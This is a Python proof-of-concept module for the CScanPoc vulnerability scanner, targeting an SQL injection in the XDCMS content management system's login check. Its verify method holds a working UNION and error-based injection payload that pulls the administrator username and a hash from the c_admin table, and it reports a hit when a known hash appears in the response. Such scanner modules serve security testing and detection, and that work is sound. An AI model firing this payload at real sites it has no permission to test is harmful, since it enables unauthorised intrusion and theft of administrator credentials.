# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'XDCMS_0003'  # 平台漏洞编号，留空
    name = 'XDCMS企业管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-26'  # 漏洞公布时间
    desc = '''
        XDcms是南宁旭东网络科技有限公司推出的一套开源的通用的内容管理系统。主要使用php+mysql+smarty技术基础进行开发，XDcms采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，二次开发能力优秀。
        旭东企业网站管理系统订餐网站管理系统，主要使用PHP开发的在线订餐门户网站系统，集成在线订餐、团购、积分商城、优惠券、新闻资讯、在线订单、在线支付、生成订单短信/邮箱通知、点评、Baidu地图、无线打印机、手机订餐功能于一体餐饮行业门户。
        XDCMS /index.php?m=xdcms&c=login&f=check SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=94532'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'XDCMS(旭东企业网站管理系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1746659c-5c49-4689-aff7-946e4befda6d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?m=xdcms&c=login&f=check'
            data = "username=aaaaaa'UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,md5(c)) FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#&password=aaaaaa&submit=+%B5%C7&C2%BC+"
            url = self.target + payload
            r = requests.post(url, data=data)

            if "4a8a08f09d37b73795649038408b5f33" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
